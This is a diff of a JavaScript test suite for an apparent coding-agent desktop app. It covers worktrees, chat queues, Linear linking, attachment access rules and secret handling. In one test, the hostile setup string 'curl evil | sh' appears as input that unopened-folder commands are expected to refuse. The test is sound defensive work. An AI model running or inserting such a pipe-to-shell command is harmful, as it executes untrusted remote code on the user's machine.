+  assert.equal(await runtime.invoke("chat:queue-remove", [chatId, second.id]), true);
+  assert.equal(await runtime.invoke("chat:queue-remove", [chatId, second.id]), false);
+  await assert.rejects(runtime.invoke("chat:queue-send", [`${project}#999`, first.id]), /existing Chat/);
+
+  await runtime.invoke("chat:queue-send", [chatId, first.id]);
+  await until(() => prompts.length === 2);
+  assert.equal(prompts[1], "then this");
+  assert.equal((await sessionOf()).queued, undefined);
+  const { messages } = (await runtime.invoke("project:snapshot", [project])).state;
+  assert.deepEqual(
+    messages.map((item) => [item.role, item.body, item.outcome]),
+    [
+      ["user", "long job", undefined],
+      ["assistant", "Working.", "cancelled"],
+      ["user", "then this", undefined],
+    ],
+  );
+});
+
+test("chat:reload adds no line to an empty Chat", async (t) => {
+  const { project, make } = await fixture(t);
+  const runtime = make({ titleModels: {} });
+  const opened = await runtime.openProject(project);
+  const chat = Object.values(opened.state.sessions)[0];
+  await runtime.invoke("chat:reload", [`${project}#${chat.id}`]);
+  assert.deepEqual((await runtime.invoke("project:snapshot", [project])).state.messages, []);
+});
+
+test("project:recent names each Project's Git origin, so other computers can show the same repository as one", async (t) => {
+  const { project, make } = await fixture(t);
+  execFileSync("git", ["-C", project, "remote", "add", "origin", "git@github.com:The-PTF/milagre-ade.git"], { stdio: "ignore" });
+  const runtime = make();
+  await runtime.openProject(project);
+  const [entry] = await runtime.invoke("project:recent");
+  assert.equal(entry.origin, "github.com/the-ptf/milagre-ade");
+});
+
+test("project:known offers every Project the Mac knows, past the recent list's ten, newest first with its origin", async (t) => {
+  const { project, make } = await fixture(t);
+  execFileSync("git", ["-C", project, "remote", "add", "origin", "git@github.com:The-PTF/milagre-ade.git"], { stdio: "ignore" });
+  const runtime = make();
+  await runtime.openProject(project);
+  const others = [];
+  for (let index = 0; index < 10; index++) {
+    const folder = path.join(path.dirname(project), `other-${index}`);
+    await fs.mkdir(folder);
+    execFileSync("git", ["init", "-q", folder], { stdio: "ignore" });
+    await runtime.openProject(folder);
+    others.push(folder);
+  }
+  const recent = await runtime.invoke("project:recent");
+  assert.equal(recent.length, 10);
+  assert.ok(!recent.some((item) => item.path === project), "the first Project fell off the recent list");
+  const known = await runtime.invoke("project:known");
+  assert.deepEqual(
+    known.map((item) => item.path),
+    [...others.toReversed(), project],
+  );
+  assert.equal(known.at(-1).origin, "github.com/the-ptf/milagre-ade");
+  assert.equal(known.at(-1).name, path.basename(project));
 });
 
 test("linked Worktrees resolve to one registered Project without losing saved Chats", async (t) => {
@@ -610,7 +1153,7 @@ test("path-taking commands refuse folders that are not open or recent", async (t
   const { project, make } = await fixture(t);
   const runtime = make();
   const stranger = await fs.mkdtemp(path.join(os.tmpdir(), "milagre-stranger-"));
-  t.after(() => fs.rm(stranger, { recursive: true, force: true }));
+  t.after(() => fs.rm(stranger, { recursive: true, force: true, maxRetries: 8, retryDelay: 100 }));
   for (const [method, args] of [
     ["worktree-setup:save", [stranger, "curl evil | sh"]],
     ["files-to-copy:read", [stranger]],
@@ -634,14 +1177,18 @@ test("an open project's worktree folders are read without its whole state", asyn
   await assert.rejects(runtime.invoke("project:worktree-paths", [path.join(project, "elsewhere")]), /Open the project/);
 });
 
-test("attachment preview command serves Worktree files and saved external attachments only", async (t) => {
+test("attachment preview serves Worktree files, saved attachments and exact files shared in assistant replies", async (t) => {
   const { project, make } = await fixture(t);
   const first = make();
   const opened = await first.invoke("project:current");
   const local = path.join(project, "ui.tsx");
   const external = path.join(path.dirname(project), "attached.txt");
+  const shared = path.join(path.dirname(project), "shared report.md");
+  const unshared = path.join(path.dirname(project), "private.txt");
   await fs.writeFile(local, "export const ui = true;");
   await fs.writeFile(external, "outside the Worktree");
+  await fs.writeFile(shared, "Shared by the agent");
+  await fs.writeFile(unshared, "Private");
   assert.equal((await first.invoke("attachment:preview", [local])).text, "export const ui = true;");
   await assert.rejects(first.invoke("attachment:preview", [external]), /attached file|open Worktree/);
   await first.invoke("chat:patch", [project, Number(Object.keys(opened.state.sessions)[0]), { title: "Attachments" }]);
@@ -657,10 +1204,27 @@ test("attachment preview command serves Worktree files and saved external attach
     files: [external],
     context: null,
   });
+  state.messages.push({
+    id: state.next_id++,
+    session_id: Number(Object.keys(opened.state.sessions)[0]),
+    role: "assistant",
+    body: `Read the [report](../shared%20report.md:12). A plain mention grants no access: ${unshared}`,
+    context: null,
+  });
   await fs.writeFile(stored, JSON.stringify(state));
   const second = make();
   await second.invoke("project:current");
   assert.equal((await second.invoke("attachment:preview", [external])).text, "outside the Worktree");
+  assert.equal((await second.invoke("attachment:preview", [shared])).text, "Shared by the agent");
+  await assert.rejects(second.invoke("attachment:preview", [unshared]), /attached file|open Worktree/);
+  await second.close();
+  const third = make({ lazyMessages: { idleMs: 0, sweepMs: 0 } });
+  await third.invoke("project:current");
+  await third.flush();
+  await third.unloadIdle();
+  assert.equal(require("./message-store.cjs").savedRows(project)?.size ?? 0, 0, "Chat transcript is unloaded");
+  assert.equal((await third.invoke("attachment:preview", [shared])).text, "Shared by the agent", "sharing survives a restart");
+  assert.equal(require("./message-store.cjs").savedRows(project)?.size ?? 0, 0, "preview does not reload the Chat");
 });
 
 // A clone of a remote that has moved on: the clone's main is one commit behind.
@@ -675,7 +1239,7 @@ async function trailingClone(project) {
   await fs.writeFile(path.join(remote, "README.md"), "shop\n");
   remoteGit("add", ".");
   remoteGit("commit", "-qm", "init");
-  execFileSync("git", ["clone", "--quiet", remote, clone]);
+  execFileSync("git", ["clone", "--quiet", "--config", "core.autocrlf=false", remote, clone]);
   await fs.writeFile(path.join(remote, "NEWS.md"), "shipped\n");
   remoteGit("add", ".");
   remoteGit("commit", "-qm", "ship");
@@ -719,12 +1283,45 @@ test("worktree:create syncs main first only when main sync is on, and survives a
   assert.equal(off.override, false);
   await runtime.invoke("main-sync:save", [clone, null]);
 
-  await fs.rm(remote, { recursive: true, force: true });
+  await fs.rm(remote, { recursive: true, force: true, maxRetries: 8, retryDelay: 100 });
   const created = await create();
   assert.ok(Number.isInteger(created.worktreeId), "A failed sync never blocks the Worktree");
   const last = (await runtime.invoke("main-sync:read", [clone])).last;
   assert.equal(last.outcome, "failed");
   assert.equal(last.message, "Could not reach origin");
+});
+
+test("worktree:create syncs the selected source branch and leaves main alone", async (t) => {
+  const { project, events, make } = await fixture(t);
+  const { clone, git, behind, ahead } = await trailingClone(project);
+  git("switch", "-q", "-c", "release/v2", "--track", "origin/main");
+  const runtime = make({ cwd: clone, worktreeRoot: path.join(path.dirname(project), "worktrees") });
+  await runtime.openProject(clone);
+  await runtime.invoke("main-sync:save", [clone, true]);
+  await runtime.invoke("worktree:create", [{ projectPath: clone, baseBranch: "release/v2", prompt: "" }]);
+  assert.equal(git("rev-parse", "release/v2"), ahead);
+  assert.equal(git("rev-parse", "main"), behind);
+  assert.equal(await fs.readFile(path.join(clone, "NEWS.md"), "utf8"), "shipped\n");
+  assert.equal(events.find(({ channel }) => channel === "main-sync:status").payload.last.branch, "release/v2");
+});
+
+test("concurrent Worktrees from different branches each sync their source", async (t) => {
+  const { project, events, make } = await fixture(t);
+  const { clone, git, ahead } = await trailingClone(project);
+  git("branch", "--track", "release/v2", "origin/main");
+  const runtime = make({ cwd: clone, worktreeRoot: path.join(path.dirname(project), "worktrees") });
+  await runtime.openProject(clone);
+  await runtime.invoke("main-sync:save", [clone, true]);
+  await Promise.all(["main", "release/v2"].map((baseBranch) => runtime.invoke("worktree:create", [{ projectPath: clone, baseBranch, prompt: "" }])));
+  assert.equal(git("rev-parse", "main"), ahead);
+  assert.equal(git("rev-parse", "release/v2"), ahead);
+  assert.deepEqual(
+    events
+      .filter(({ channel }) => channel === "main-sync:status")
+      .map(({ payload }) => payload.last.branch)
+      .sort(),
+    ["main", "release/v2"],
+  );
 });
 
 test("two worktree:create calls share one sync", async (t) => {
@@ -779,7 +1376,7 @@ test("linear commands connect, report and disconnect, and emit the status", asyn
     ["acme"],
   );
   assert.deepEqual(await runtime.invoke("linear:disconnect", [{ workspace: "acme" }]), { connected: false, workspaces: [] });
-  assert.deepEqual(events.filter((event) => event.channel === "linear:status-changed").at(-1).payload, { connected: false, workspaces: [] });
+  assert.deepEqual(events.findLast((event) => event.channel === "linear:status-changed").payload, { connected: false, workspaces: [] });
 });
 
 test("flush ends a waiting Linear sign-in instead of waiting out its timeout", async (t) => {
@@ -937,10 +1534,10 @@ test("linear:worktree-issues names a worktree's issue and linear:issues reports 
     },
   });
   await runtime.openProject(project);
-  assert.deepEqual(await runtime.invoke("linear:issues", [{}]), { error: "Linear is off in Settings › Experimental.", notConnected: true });
+  assert.deepEqual(await runtime.invoke("linear:issues", [{}]), { error: "Linear is off in Settings › Connections › Linear.", notConnected: true });
   assert.deepEqual(await runtime.invoke("linear:worktree-issues", [project]), {});
   assert.deepEqual(await runtime.invoke("linear:enabled:save", [true]), { enabled: true });
-  assert.deepEqual(events.filter((event) => event.channel === "linear:enabled-changed").at(-1).payload, { enabled: true });
+  assert.deepEqual(events.findLast((event) => event.channel === "linear:enabled-changed").payload, { enabled: true });
   await connectLinearFixture(dataDir);
 
   const issues = await runtime.invoke("linear:issues", [{}]);
@@ -979,7 +1576,7 @@ test("worktree:create from a Linear issue refuses while Linear is off or disconn
   const attempt = () => runtime.invoke("worktree:create", [{ projectPath: project, baseBranch: "main", prompt: "x", issueKey: "ENG-12" }]);
 
   // Off: nothing stored, so the switch is off and no token exists.
-  await assert.rejects(attempt(), { message: "Linear is off in Settings › Experimental." });
+  await assert.rejects(attempt(), { message: "Linear is off in Settings › Connections › Linear." });
 
   // On, but never connected.
   await fs.mkdir(path.join(dataDir, "linear"), { recursive: true });
@@ -1032,7 +1629,7 @@ test("worktree:link-issue renames a Milagre-named branch with no open PR to the 
   assert.equal(stored.linearIssue, "ENG-12");
   assert.equal(stored.linearWorkspace, "acme");
   assert.equal(branchOf(worktree.path), "eng-12-fix-login");
-  assert.deepEqual(events.filter((event) => event.channel === "worktree:renamed").at(-1).payload, {
+  assert.deepEqual(events.findLast((event) => event.channel === "worktree:renamed").payload, {
     projectPath: linked.project.path,
     path: worktree.path,
     from: worktree.name,
@@ -1144,7 +1741,7 @@ test("worktree:link-issue refuses while Linear is off, disconnected, malformed o
   const { project, dataDir, runtime, worktreeId, worktree, events } = await linkFixture(t);
   const attempt = (key = "ENG-12") => runtime.invoke("worktree:link-issue", [{ projectPath: project, worktreeId, key }]);
   await fs.writeFile(path.join(dataDir, "linear", "settings.json"), JSON.stringify({ enabled: false }));
-  await assert.rejects(attempt(), { message: "Linear is off in Settings › Experimental." });
+  await assert.rejects(attempt(), { message: "Linear is off in Settings › Connections › Linear." });
   await fs.writeFile(path.join(dataDir, "linear", "settings.json"), JSON.stringify({ enabled: true }));
   await fs.rm(path.join(dataDir, "linear", "workspaces", "acme.json"));
   await assert.rejects(attempt(), { message: "Linear isn't connected." });
@@ -1166,11 +1763,381 @@ test("worktree:link-issue reports an issue Linear no longer has, and nothing cha
 });
 
 test("worktree:unlink-issue removes the stored key and never renames the branch back", async (t) => {
-  const { project, runtime, worktreeId, worktree } = await linkFixture(t);
+  const { project, runtime, worktreeId, worktree, events } = await linkFixture(t);
   await runtime.invoke("worktree:link-issue", [{ projectPath: project, worktreeId, key: "ENG-12" }]);
   const unlinked = await runtime.invoke("worktree:unlink-issue", [{ projectPath: project, worktreeId }]);
   const after = unlinked.project.state.worktrees[worktreeId];
-  assert.equal("linearIssue" in after, false);
+  assert.equal(after.linearIssue, null);
+  assert.equal("linearWorkspace" in after, false);
+  await runtime.flush();
+  assert.equal((await readSavedState(project)).worktrees[worktreeId].linearIssue, null, "The unlink survives a restart");
+  assert.equal(events.findLast(({ channel }) => channel === "project:state").payload.state.worktrees[worktreeId].linearIssue, null);
   assert.equal(after.name, "eng-12-fix-login");
   assert.equal(branchOf(worktree.path), "eng-12-fix-login");
+});
+
+test("unlinking hides a branch-named issue after refresh, and relinking restores it", async (t) => {
+  const { project, runtime, worktreeId, worktree } = await linkFixture(t);
+  const readIssues = () => runtime.invoke("linear:worktree-issues", [project]);
+  const link = () => runtime.invoke("worktree:link-issue", [{ projectPath: project, worktreeId, key: "ENG-12" }]);
+  await link();
+  assert.equal((await readIssues())[worktree.path].key, "ENG-12");
+  await runtime.invoke("worktree:unlink-issue", [{ projectPath: project, worktreeId }]);
+  assert.deepEqual(await readIssues(), {});
+  await runtime.openProject(project);
+  assert.deepEqual(await readIssues(), {}, "Project reconciliation preserves the explicit unlink");
+  await link();
+  assert.equal((await readIssues())[worktree.path].key, "ENG-12");
+});
+
+test("Project save failure and recovery publish status without another edit", async (t) => {
+  const { project, make, events } = await fixture(t);
+  const runtime = make();
+  const opened = await runtime.invoke("project:current");
+  const session = Object.values(opened.state.sessions)[0];
+  await runtime.invoke("chat:patch", [project, session.id, { title: "Before failure" }]);
+  await runtime.flush();
+  const file = path.join(project, ".milagre", "coordination.json");
+  const backup = `${file}.save-check`;
+  await fs.rename(file, backup);
+  await fs.mkdir(file);
+  try {
+    const before = events.length;
+    await assert.rejects(runtime.invoke("chat:patch", [project, session.id, { title: "Newest title" }]));
+    const failed = events.slice(before).findLast((event) => event.channel === "project:state");
+    assert.ok(failed.payload.state.persistence?.error, "the failed write itself announces unsaved status");
+    assert.ok(runtime.snapshot().projects.find((entry) => entry.path === project).state.persistence);
+  } finally {
+    await fs.rmdir(file);
+    await fs.rename(backup, file);
+  }
+  const before = events.length;
+  await runtime.invoke("scope:retry-save", [project]);
+  const recovered = events.slice(before).filter((event) => event.channel === "project:state");
+  assert.equal(recovered[0].payload.state.persistence.saving, true);
+  assert.equal(recovered.at(-1).payload.state.persistence, undefined);
+  const saved = await readSavedState(project);
+  assert.equal(saved.sessions[session.id].title, "Newest title");
+  assert.equal(saved.persistence, undefined);
+  await assert.rejects(runtime.invoke("scope:retry-save", [path.join(project, "unopened")]), /Open the Project/);
+});
+
+test("chats:home reports a missing home without creating it", async (t) => {
+  const { make, chatsHome } = await fixture(t);
+  const runtime = make();
+  assert.deepEqual(await runtime.invoke("chats:home"), { path: chatsHome, exists: false });
+  await assert.rejects(fs.stat(chatsHome), { code: "ENOENT" });
+});
+
+test("chats:ensure opens the home with kind chats and isolation-ready worktrees", async (t) => {
+  const { make, chatsHome } = await fixture(t);
+  const runtime = make({ worktreeRoot: path.join(path.dirname(chatsHome), "worktrees") });
+  const opened = await runtime.invoke("chats:ensure");
+  assert.equal(opened.path, chatsHome);
+  assert.equal(opened.kind, "chats");
+  assert.equal(opened.name, "No project");
+  assert.notEqual(opened.git, false);
+  assert.ok(opened.state.worktrees);
+  assert.deepEqual(await runtime.invoke("chats:home"), { path: chatsHome, exists: true });
+  // A second ensure (a double click) opens the same home without another git init.
+  assert.equal((await runtime.invoke("chats:ensure")).path, chatsHome);
+  const made = await runtime.invoke("worktree:create", [{ projectPath: chatsHome, baseBranch: "main", prompt: "" }]);
+  assert.ok(made.project.state.worktrees[made.worktreeId].path.startsWith(path.join(path.dirname(chatsHome), "worktrees", "chats") + path.sep));
+  // The snapshot holds the home's state for a reconnecting window, marked as the home.
+  const listed = runtime.snapshot().projects.find((project) => project.path === chatsHome);
+  assert.equal(listed?.kind, "chats");
+  assert.equal(listed?.name, "No project");
+  assert.equal((await runtime.invoke("project:snapshot", [chatsHome])).kind, "chats");
+  const other = await runtime.invoke("project:current");
+  assert.equal("kind" in other, false);
+  assert.equal("kind" in (await runtime.invoke("project:snapshot", [other.path])), false);
+});
+
+test("openProject with remember:false leaves recent untouched", async (t) => {
+  const { make, project, chatsHome, dataDir } = await fixture(t);
+  const runtime = make();
+  await runtime.invoke("project:current");
+  const recentBefore = await runtime.invoke("project:recent");
+  const registryBefore = await runtime.invoke("project:registry");
+  const plain = path.join(path.dirname(project), "notes");
+  await fs.mkdir(plain);
+  await runtime.openProject(plain, { remember: false, register: false });
+  assert.deepEqual(await runtime.invoke("project:recent"), recentBefore);
+  assert.deepEqual(await runtime.invoke("project:registry"), registryBefore);
+  // The home is never remembered, whichever way it opens: the phone's and a reconnect's project:open take the default.
+  await runtime.invoke("chats:ensure");
+  await runtime.openProject(chatsHome);
+  assert.deepEqual(await runtime.invoke("project:recent"), recentBefore);
+  assert.ok(!(await fs.readFile(path.join(dataDir, "recent-projects.json"), "utf8")).includes(chatsHome));
+  assert.ok(!(await fs.readFile(path.join(dataDir, "project-registry.json"), "utf8")).includes(chatsHome));
+  // Launch opens the last real Project, not the home.
+  assert.equal((await runtime.invoke("project:current")).path, project);
+});
+
+test("project:registry, project:recent and project_list leave the Chats home out", async (t) => {
+  const { make, chatsHome } = await fixture(t);
+  const runtime = make();
+  await runtime.invoke("project:current");
+  await runtime.invoke("chats:ensure");
+  for (const method of ["project:registry", "project:recent"]) {
+    const list = await runtime.invoke(method);
+    assert.ok(list.length > 0, method);
+    assert.ok(!list.some((item) => item.path === chatsHome), method);
+  }
+  const status = await runtime.invoke("local-mcp:status");
+  assert.ok(!status.projects.some((item) => item.path === chatsHome));
+});
+
+test("project:read and project:switch accept the Chats home without it being recent", async (t) => {
+  const { make, chatsHome } = await fixture(t);
+  const runtime = make();
+  await runtime.invoke("project:current");
+  await assert.rejects(runtime.invoke("project:read", [chatsHome]), /Open this project/);
+  await runtime.invoke("chats:ensure");
+  const read = await runtime.invoke("project:read", [chatsHome]);
+  assert.equal(read.kind, "chats");
+  assert.ok(read.state);
+  const lean = await runtime.invoke("project:read", [chatsHome, { state: false }]);
+  assert.equal(lean.kind, "chats");
+  assert.equal("state" in lean, false);
+  const switched = await runtime.invoke("project:switch", [chatsHome]);
+  assert.equal(switched.path, chatsHome);
+  assert.equal(switched.kind, "chats");
+  assert.ok(!(await runtime.invoke("project:recent")).some((item) => item.path === chatsHome));
+});
+
+test("a project-less Chat stopped by a quit continues on launch, though the home isn't recent", async (t) => {
+  const { make, chatsHome } = await fixture(t);
+  const first = make();
+  const opened = await first.invoke("chats:ensure");
+  const session = Object.values(opened.state.sessions)[0];
+  await first.invoke("chat:patch", [chatsHome, session.id, { title: "Quick question" }]);
+  await first.close();
+  const file = path.join(chatsHome, ".milagre/coordination.json");
+  const saved = JSON.parse(await fs.readFile(file, "utf8"));
+  saved.sessions[session.id].resumeTurn = { stoppedAt: 0 };
+  await fs.writeFile(file, JSON.stringify(saved));
+  const second = make();
+  await second.resumeRecentProjects();
+  assert.equal((await second.invoke("project:snapshot", [chatsHome])).kind, "chats");
+});
+
+// A Chat that waits on an approval: its turn starts and asks at once.
+function waitingSession(_provider, options) {
+  return {
+    turnActive: false,
+    async startTurn() {
+      this.turnActive = true;
+      options.emit({ type: "turn-started", turnId: "turn-1" });
+      options.emit({ type: "permission-request", requestId: "permission-1", kind: "command", tool: "Shell", title: "Run?", command: "ls", allowForChat: true });
+      return { turnId: "turn-1" };
+    },
+    respondToPermission: () => true,
+    async close() {
+      this.turnActive = false;
+    },
+    async interrupt() {},
+  };
+}
+
+async function waitingHomeChat(t) {
+  const { make, chatsHome } = await fixture(t);
+  const notices = [];
+  const runtime = make({
+    titleModels: {},
+    agentCli: async () => ({ command: "/fake" }),
+    createSession: waitingSession,
+    notifyWaiting: (notice) => notices.push(notice),
+  });
+  const opened = await runtime.invoke("chats:ensure");
+  const session = Object.values(opened.state.sessions)[0];
+  await runtime.invoke("chat:send", [{ projectPath: chatsHome, sessionId: session.id, body: "Explain this error", provider: "claude", model: "fixture" }]);
+  const deadline = Date.now() + 5000;
+  while (!notices.length && Date.now() < deadline) await new Promise((resolve) => setTimeout(resolve, 10));
+  return { runtime, chatsHome, chatId: `${chatsHome}#${session.id}`, notices };
+}
+
+test('chat:inbox names a project-less Chat\'s Project "No project"', async (t) => {
+  const { runtime, chatId } = await waitingHomeChat(t);
+  const item = (await runtime.invoke("chat:inbox")).items.find((entry) => entry.key === chatId);
+  assert.equal(item?.status, "approval");
+  assert.equal(item.project, "No project");
+});
+
+test('an attention notice for a project-less Chat is titled "No project"', async (t) => {
+  const { chatId, notices } = await waitingHomeChat(t);
+  const notice = notices.find((entry) => entry.chatId === chatId);
+  assert.ok(notice, "the approval notice went out");
+  // A notice is titled by its Chat, and never names the home's folder.
+  assert.notEqual(notice.title, "chats");
+  assert.doesNotMatch(`${notice.title} ${notice.body}`, /\bchats\b/);
+});
+
+async function homeChatOnWorktree(t) {
+  const { make, chatsHome, dataDir } = await fixture(t);
+  const runtime = make({ worktreeRoot: path.join(path.dirname(chatsHome), "worktrees") });
+  await runtime.invoke("chats:ensure");
+  const made = await runtime.invoke("worktree:create", [{ projectPath: chatsHome, baseBranch: "main", prompt: "" }]);
+  const worktree = made.project.state.worktrees[made.worktreeId];
+  const session = Object.values(made.project.state.sessions).find((item) => item.worktree_id === worktree.id);
+  return { runtime, chatsHome, dataDir, worktree, chatId: `${chatsHome}#${session.id}`, sessionId: session.id };
+}
+
+async function savedScreen(dataDir, chatId, image = "SAVED_SCREEN") {
+  const dir = path.join(dataDir, "computer-use", "frames");
+  const name = require("node:crypto").createHash("sha256").update(chatId).digest("hex").slice(0, 24);
+  await fs.mkdir(dir, { recursive: true });
+  const file = path.join(dir, `${name}.json`);
+  await fs.writeFile(file, JSON.stringify({ seq: 1, image, at: Date.now() }));
+  return file;
+}
+
+test("chat:delete removes its screen and rejects pending, later and restarted viewers", async (t) => {
+  const { make, project, dataDir } = await fixture(t);
+  const runtime = make();
+  const opened = await runtime.invoke("project:current");
+  const session = Object.values(opened.state.sessions)[0];
+  const chatId = `${project}#${session.id}`;
+  const file = await savedScreen(dataDir, chatId);
+  assert.equal((await runtime.invoke("computer-use:frame", [{ chatId }])).image, "SAVED_SCREEN");
+  const pending = assert.rejects(runtime.invoke("computer-use:frame", [{ chatId, after: 1 }]), /existing Chat/);
+  await new Promise((resolve) => setImmediate(resolve));
+  await runtime.invoke("chat:delete", [project, session.id]);
+  await pending;
+  await assert.rejects(fs.stat(file), { code: "ENOENT" });
+  await assert.rejects(runtime.invoke("computer-use:frame", [{ chatId }]), /existing Chat/);
+  await runtime.close();
+  const restarted = make();
+  await restarted.invoke("project:current");
+  await assert.rejects(restarted.invoke("computer-use:frame", [{ chatId }]), /existing Chat/);
+});
+
+test("screen requests refuse unopened and nonexistent Chats but keep existing Chats' frames", async (t) => {
+  const { make, project, dataDir } = await fixture(t);
+  const runtime = make();
+  const opened = await runtime.invoke("project:current");
+  const session = Object.values(opened.state.sessions)[0];
+  const chatId = `${project}#${session.id}`;
+  await savedScreen(dataDir, chatId);
+  for (const missing of ["/unopened#1", `${project}#999999`]) {
+    await savedScreen(dataDir, missing);
+    await assert.rejects(runtime.invoke("computer-use:frame", [{ chatId: missing }]), /existing Chat/);
+  }
+  await runtime.close();
+  const restarted = make();
+  await restarted.invoke("project:current");
+  assert.equal((await restarted.invoke("computer-use:frame", [{ chatId }])).image, "SAVED_SCREEN");
+});
+
+test("worktree:remove removes a Chats home worktree and drops its Chat", async (t) => {
+  const { runtime, chatsHome, dataDir, worktree, chatId, sessionId } = await homeChatOnWorktree(t);
+  const screenFile = await savedScreen(dataDir, chatId);
+  const seen = await runtime.invoke("worktree:status", [worktree.path, "main"]);
+  assert.equal(seen.removable, true);
+  const result = await runtime.invoke("worktree:remove", [worktree.path, { projectPath: chatsHome, base: "main", seen, force: false, chatId }]);
+  assert.equal(result.removed, true);
+  await assert.rejects(fs.stat(worktree.path), { code: "ENOENT" });
+  const state = (await runtime.invoke("project:snapshot", [chatsHome])).state;
+  assert.equal(state.worktrees[worktree.id], undefined);
+  assert.equal(state.sessions[sessionId], undefined);
+  await assert.rejects(fs.stat(screenFile), { code: "ENOENT" });
+  await assert.rejects(runtime.invoke("computer-use:frame", [{ chatId }]), /existing Chat/);
+  // The home itself stays.
+  assert.ok((await fs.stat(chatsHome)).isDirectory());
+});
+
+test("worktree:remove of a Chats home worktree holding files needs delete, and delete removes it", async (t) => {
+  const { runtime, chatsHome, worktree, chatId, sessionId } = await homeChatOnWorktree(t);
+  await fs.writeFile(path.join(worktree.path, "notes.md"), "keep me");
+  const seen = await runtime.invoke("worktree:status", [worktree.path, "main"]);
+  assert.equal(seen.removable, false);
+  assert.equal(seen.uncommitted, 1);
+  await assert.rejects(
+    runtime.invoke("worktree:remove", [worktree.path, { projectPath: chatsHome, base: "main", seen, force: false, chatId }]),
+    /changed after it was checked/,
+  );
+  assert.ok((await fs.stat(path.join(worktree.path, "notes.md"))).isFile());
+  const result = await runtime.invoke("worktree:remove", [worktree.path, { projectPath: chatsHome, base: "main", seen, force: true, chatId }]);
+  assert.equal(result.removed, true);
+  await assert.rejects(fs.stat(worktree.path), { code: "ENOENT" });
+  const state = (await runtime.invoke("project:snapshot", [chatsHome])).state;
+  assert.equal(state.worktrees[worktree.id], undefined);
+  assert.equal(state.sessions[sessionId], undefined);
+});
+
+test("secret submissions bypass provider answers, summaries, persistence and replay", async (t) => {
+  const { project, make, events, dataDir } = await fixture(t);
+  const fake = reloadAgents();
+  fake.running();
+  const runtime = make({ titleModels: {}, agentCli: async () => ({ command: "/fake" }), createSession: fake.createSession });
+  const opened = await runtime.openProject(project);
+  const chat = Object.values(opened.state.sessions)[0];
+  const chatId = `${project}#${chat.id}`;
+  await runtime.invoke("chat:send", [{ projectPath: project, sessionId: chat.id, body: "Connect service", provider: "claude", model: "claude-opus-5-5" }]);
+  for (let i = 0; i < 200 && !fake.sessions.length; i++) await new Promise((resolve) => setTimeout(resolve, 10));
+  const session = fake.sessions[0];
+  session.answerQuestion = () => {
+    throw new Error("Secret reached provider answers");
+  };
+  const tool = session.options.linked.tools.find((item) => item.name === "request_secret");
+  assert.ok(tool);
+  const result = tool.run({ title: "Service token", description: "Connect the service." });
+  let question;
+  for (let i = 0; i < 200 && !question; i++) {
+    question = events.find((item) => item.payload?.event?.secretRequest)?.payload.event;
+    if (!question) await new Promise((resolve) => setTimeout(resolve, 10));
+  }
+  assert.ok(question);
+  const sentinel = "SECRET_SENTINEL_never_in_history";
+  const args = { chatId, requestId: question.requestId, answers: { secret: [sentinel] }, summary: sentinel };
+  assert.equal(await runtime.invoke("agent:answer-question", [args]), true);
+  const saved = JSON.parse(await result);
+  assert.equal(await fs.readFile(saved.path, "utf8"), sentinel);
+  assert.equal(await runtime.invoke("agent:answer-question", [args]), false);
+  const cancelled = tool.run({ title: "Another token", description: "This request will be stopped." });
+  await runtime.invoke("agent:interrupt", [chatId]);
+  assert.match(await cancelled, /cancelled/);
+  const snapshot = await runtime.invoke("project:snapshot", [project]);
+  assert.ok(!JSON.stringify(snapshot).includes(sentinel));
+  assert.ok(!JSON.stringify(events).includes(sentinel));
+  await runtime.close();
+  assert.ok(!JSON.stringify(await readSavedState(project)).includes(sentinel));
+  assert.equal((await fs.readdir(path.join(dataDir, "chat-secrets"))).length, 1);
+});
+
+test("Project Git settings govern default bases, names, rules and explicit per-Chat base overrides", async (t) => {
+  const { project, make, dataDir } = await fixture(t);
+  const git = (...args) =>
+    execFileSync("git", ["-C", project, "-c", "user.name=Test", "-c", "user.email=test@example.invalid", ...args], {
+      encoding: "utf8",
+      stdio: ["ignore", "pipe", "pipe"],
+    }).trim();
+  git("commit", "--allow-empty", "-m", "Initial");
+  git("checkout", "-b", "release/example-app/v2");
+  git("commit", "--allow-empty", "-m", "Release only");
+  git("checkout", "main");
+  const runtime = make({ worktreeRoot: path.join(dataDir, "worktrees") });
+  await runtime.invoke("project:current");
+  const saved = await runtime.invoke("project-git:save", [
+    project,
+    {
+      template: "developer-{ticket?}-{slug}",
+      dashesOnly: true,
+      baseBranch: "release/example-app/v2",
+      instructions: "Use short verbs.",
+    },
+  ]);
+  assert.equal(saved.effective.trackBase, false);
+  const result = await runtime.invoke("worktree:create", [{ projectPath: project, baseBranch: "main", useProjectBase: true, prompt: "DEMO-123 fix login" }]);
+  const worktree = result.project.state.worktrees[result.worktreeId];
+  assert.match(worktree.name, /^developer-demo-123-[a-z0-9-]+$/);
+  assert.equal(git("rev-parse", worktree.name), git("rev-parse", "release/example-app/v2"));
+  assert.throws(() => git("rev-parse", `${worktree.name}@{u}`));
+  assert.equal(worktree.generatedBranch, worktree.name);
+  const overridden = await runtime.invoke("worktree:create", [{ projectPath: project, baseBranch: "main", prompt: "another change" }]);
+  assert.equal(git("rev-parse", overridden.project.state.worktrees[overridden.worktreeId].name), git("rev-parse", "main"));
+  await assert.rejects(runtime.invoke("project-git:save", [project, { template: "milagre/{slug}", dashesOnly: true }]), /dashes only/);
+  assert.equal((await runtime.invoke("project-git:read", [project])).effective.baseBranch, "release/example-app/v2");
+  await runtime.invoke("project-git:save", [project, { baseBranch: "missing-release" }]);
+  await assert.rejects(runtime.invoke("worktree:create", [{ projectPath: project, prompt: "missing base" }]), /missing from this project/);
 });
